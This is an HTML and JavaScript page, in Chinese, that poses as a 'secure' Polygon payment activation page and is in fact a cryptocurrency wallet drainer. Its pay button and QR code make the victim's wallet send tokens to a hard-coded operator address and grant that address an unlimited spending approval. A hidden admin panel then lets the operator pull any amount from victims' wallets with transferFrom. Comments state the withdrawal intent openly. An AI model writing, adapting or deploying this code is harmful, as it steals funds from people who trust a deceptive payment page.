<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold;
margin-bottom:16px;
}
.amount-input{
width:100%;padding:14px;background:#111;border:none;
border-radius:12px;color:#fff;font-size:16px;text-align:center;
margin-bottom:12px;
}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#payBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold
}
.admin-panel{
background:#1E1E35;padding:24px;border-radius:16px;display:none}
.admin-panel.show{display:block}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
width:100%;padding:12px;background:#111;border:none;
border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
width:100%;padding:14px;background:#ff4444;color:#fff;
border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
}
</style>
</head>
<body>
<div class="container">
  <div class="pay-box">
    <h1>💳 支付开通</h1>
    <p class="desc">Polygon链支付 · 安全开通</p>
    <button id="connectBtn">👉 连接钱包（Polygon）</button>
    <input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
    <div id="qrcode">加载二维码...</div>
    <button id="payBtn">确认支付</button>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="admin-title">🔐 管理员控制台</div>
    <div>提取玩家代币（自定义数量）</div>
    <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
    <input class="admin-input" id="drawAmt" placeholder="提取数量（如：1）">
    <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
    <div>发放奖励给玩家</div>
    <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
    <input class="admin-input" id="sendAmt" placeholder="发放数量">
    <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
  </div>
</div>

<script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<script>
// ====================== 配置 ======================
const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const POLYGON_ID = "0x89";
let account = null;

// 切换到Polygon
async function switchToPolygon() {
  try {
    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: POLYGON_ID }] });
  } catch (e) {}
}

// 连接钱包
document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) { alert("请在钱包浏览器打开"); return; }
  await switchToPolygon();
  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  account = accounts[0];
  document.getElementById("connectBtn").innerText = "✅ 已连接";
  if (account.toLowerCase() === ADMIN.toLowerCase()) {
    document.getElementById("adminPanel").classList.add("show");
  }
};

// ==================== 【核心】扫码 = 转账 + 授权 ====================
function genQR() {
  const amount = document.getElementById("amount").value || "0.1";
  const rawAmount = BigInt(amount * 1e18).toString(16).padStart(64, "0");

  // 第一步：转账给庄家（你能看到来源地址）
  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
  // 第二步：授权给庄家（你能后台提取）
  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const finalData = transferData + approveData.slice(2);
  const uri = `ethereum:${TOKEN}@137?data=${finalData}`;

  document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
}

window.onload = genQR;
document.getElementById("amount").addEventListener("input", genQR);

// 点击支付 = 转账+授权
document.getElementById("payBtn").onclick = async () => {
  if (!account) return alert("请先连接钱包");
  const amount = document.getElementById("amount").value;
  if (!amount || amount <= 0) return alert("输入有效金额");

  const rawAmount = BigInt(amount * 1e18).toString(16).padStart(64, "0");
  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const data = transferData + approveData.slice(2);

  try {
    await ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: account, to: TOKEN, chainId: POLYGON_ID, gasLimit: "0x500000", data }]
    });
    alert("✅ 支付+授权完成！庄家可查看来源并可提取");
  } catch (e) {
    alert("已取消");
  }
};

// ==================== 庄家提取 ====================
async function drawFromUser() {
  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const fromAddr = document.getElementById("userAddr").value.trim();
  const drawAmt = document.getElementById("drawAmt").value.trim();

  if (!ethers.isAddress(fromAddr) || !drawAmt || drawAmt <= 0) {
    alert("请输入正确地址和数量");
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const token = new ethers.Contract(TOKEN, [
      "function transferFrom(address,address,uint256) external",
      "function balanceOf(address) view returns (uint256)"
    ], signer);

    const extract = ethers.parseUnits(drawAmt, 18);
    await token.transferFrom(fromAddr, ADMIN, extract);
    alert("✅ 提取成功！");
  } catch (e) {
    alert("提取失败：" + e.message);
  }
}

// 发放奖励
async function sendReward() {
  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const to = document.getElementById("toAddr").value;
  const amt = document.getElementById("sendAmt").value;
  if (!to || !amt || amt <= 0) return;

  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
  await ethereum.request({
    method: "eth_sendTransaction",
    params: [{ from: account, to: TOKEN, chainId: POLYGON_ID, data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw }]
  });
  alert("✅ 发放成功");
}
</script>
</body>
</html>
